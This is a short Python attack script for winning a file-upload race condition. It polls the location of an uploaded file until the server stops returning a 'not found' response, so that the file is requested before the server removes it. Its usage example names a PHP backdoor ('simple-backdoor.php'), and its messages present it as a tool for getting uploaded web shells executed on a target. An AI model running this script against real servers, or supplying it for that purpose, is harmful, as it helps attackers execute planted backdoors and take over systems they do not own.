#!/usr/bin/env python3
import requests
import argparse

def get_args():
    parser = argparse.ArgumentParser(description='Win the File Upload Race !')
    parser.add_argument('--url', action='store', required=True, help='URL to the uploaded file location (e.g. http://<DOMAIN>/uploads/simple-backdoor.php')
    parser.add_argument('--exclude', action='store', required=True, help='Part of the response od a non-existent file (e.g. "Not Found")')
    return parser.parse_args()

if __name__ == "__main__":
    args = get_args()
    req = requests.get(url=args.url)

    print(f"[*] You can upload the file, the script is continuously requesting its given location: {args.url}")
    print("[*] Press CTRL+C (^C) to exit")
    print("[+] The race has begun...")
    while args.exclude in req.text:
        req = requests.get(url=args.url)
    print(f"[+] You won the race ! See the uploaded file's content:\n{req}\n{req.text}")
